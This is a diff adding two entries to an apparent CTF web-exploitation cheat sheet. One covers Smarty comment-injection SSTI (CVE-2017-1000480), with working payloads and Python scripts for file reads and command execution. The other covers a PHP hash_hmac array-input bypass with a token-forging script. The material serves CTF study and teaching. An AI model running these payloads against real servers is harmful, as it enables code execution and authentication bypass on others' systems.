@@ -25,6 +25,8 @@
 - [PHP Variable Variables ($$var) Abuse (bugs_bunny 2017)](#php-variable-variables-var-abuse-bugs_bunny-2017)
 - [PHP uniqid() Predictable Filename (EKOPARTY 2017)](#php-uniqid-predictable-filename-ekoparty-2017)
 - [Sequential Regex Replacement Bypass (Tokyo Westerns 2017)](#sequential-regex-replacement-bypass-tokyo-westerns-2017)
+- [PHP hash_hmac Returns NULL with Array Input (AceBear 2018)](#php-hash_hmac-returns-null-with-array-input-acebear-2018)
+- [Smarty SSTI via CVE-2017-1000480 Comment Injection (Insomni'hack 2018)](#smarty-ssti-via-cve-2017-1000480-comment-injection-insomnihack-2018)
 - [Command Injection](#command-injection)
   - [Newline Bypass](#newline-bypass)
   - [Incomplete Blocklist Bypass](#incomplete-blocklist-bypass)
@@ -275,6 +277,101 @@ ${__import__('os').popen('cat /flag.txt').read()}
 3. The attribute change persists across requests in the session
 
 **Key insight:** When SSTI filters block quotes/strings, Python's keyword argument syntax (`func(key=value)`) operates without any string delimiters. `__dict__.update()` can modify any object attribute to bypass application logic (e.g., game state, auth checks, permission levels).
+
+### Smarty SSTI via CVE-2017-1000480 Comment Injection (Insomni'hack 2018)
+
+**Pattern:** Smarty 3 < 3.1.32 with custom template resources places the template source file path inside a PHP comment (`/* ... */`) in compiled templates. If the path is user-controlled and `*/` is not sanitized, injecting `*/phpcode();/*` breaks out of the comment and executes arbitrary PHP.
+
+```text
+# Vulnerable URL pattern — template ID/path is user-controlled:
+http://target/?id=*/echo file_get_contents('/flag');/*
+
+# What happens server-side in the compiled template:
+# <?php /* source: /path/to/*/echo file_get_contents('/flag');/* */ ?>
+# The injected */ closes the comment, PHP code executes, /* reopens a comment
+```
+
+```php
+// Smarty compiled template (simplified):
+// Before injection:
+<?php /* Smarty version x, compiled from "user_template_name" */ ?>
+
+// After injection with id = */echo file_get_contents('/flag');/*
+<?php /* Smarty version x, compiled from "*/echo file_get_contents('/flag');/*" */ ?>
+// Breaks down to:
+//   /* Smarty version x, compiled from "*/   ← comment ends here
+//   echo file_get_contents('/flag');          ← PHP executes
+//   /*" */                                    ← new comment
+```
+
+```python
+import requests
+
+# Basic file read
+r = requests.get("http://target/", params={
+    "id": "*/echo file_get_contents('/flag');/*"
+})
+print(r.text)
+
+# RCE
+r = requests.get("http://target/", params={
+    "id": "*/system('id');/*"
+})
+print(r.text)
+
+# If parentheses are filtered, use backtick execution:
+r = requests.get("http://target/", params={
+    "id": "*/echo `cat /flag`;/*"
+})
+```
+
+**Key insight:** Smarty places the template source path in a `/* ... */` PHP comment. If the path is user-controlled and `*/` is not sanitized, arbitrary PHP executes. This affects custom Smarty resources (where the template name comes from user input), not the default file-based resource handler. Fixed in Smarty 3.1.32. Look for Smarty template rendering where the template identifier is derived from URL parameters.
+
+---
+
+## PHP hash_hmac Returns NULL with Array Input (AceBear 2018)
+
+**Pattern:** PHP's `hash_hmac()` returns `NULL` (with a warning, not a fatal error) when the `$data` argument is an array instead of a string. Sending `nonce[]=x` via POST forces the parameter to be an array, making the HMAC output predictable since `hash_hmac('sha256', NULL, $secret)` is equivalent to `hash_hmac('sha256', '', $secret)` -- but more critically, when the `$key` argument receives `NULL` from a prior broken `hash_hmac`, all subsequent HMAC computations use an empty key.
+
+```php
+// Vulnerable server code:
+$nonce = $_POST['nonce'];
+$secret = file_get_contents('/secret_key');
+$mac = hash_hmac('sha256', $nonce, $secret);  // returns NULL if $nonce is array
+
+// Later: server uses $mac (NULL) as key for another HMAC
+$token = hash_hmac('sha256', 'gimmeflag', $mac);
+// hash_hmac('sha256', 'gimmeflag', NULL) == hash_hmac('sha256', 'gimmeflag', '')
+// This is a known constant the attacker can precompute!
+```
+
+```python
+import hmac
+import hashlib
+import requests
+
+# Precompute the token that the server will generate when mac=NULL
+# hash_hmac('sha256', 'gimmeflag', NULL) in PHP == HMAC with empty key in Python
+known_token = hmac.new(b'', b'gimmeflag', hashlib.sha256).hexdigest()
+print(f"Predicted token: {known_token}")
+
+# Force nonce to be an array, breaking hash_hmac
+r = requests.post("http://target/getflag", data={
+    "nonce[]": "x",          # PHP receives $_POST['nonce'] as array ['x']
+    "token": known_token      # server-side comparison succeeds
+})
+print(r.text)
+```
+
+```text
+# HTTP request showing the array injection:
+POST /getflag HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+nonce[]=x&token=<precomputed_hmac>
+```
+
+**Key insight:** PHP silently coerces types, and `hash_hmac` with a non-string `$data` argument returns `NULL`/`false` instead of raising an error. Always check if parameters can be forced to arrays via `param[]=value`. This pattern extends to other PHP hash functions: `md5(array())` returns `NULL`, `sha1(array())` returns `NULL`. Any authentication flow chaining hash outputs as keys for subsequent operations is vulnerable when an intermediate hash can be forced to `NULL`.
 
 ---
 
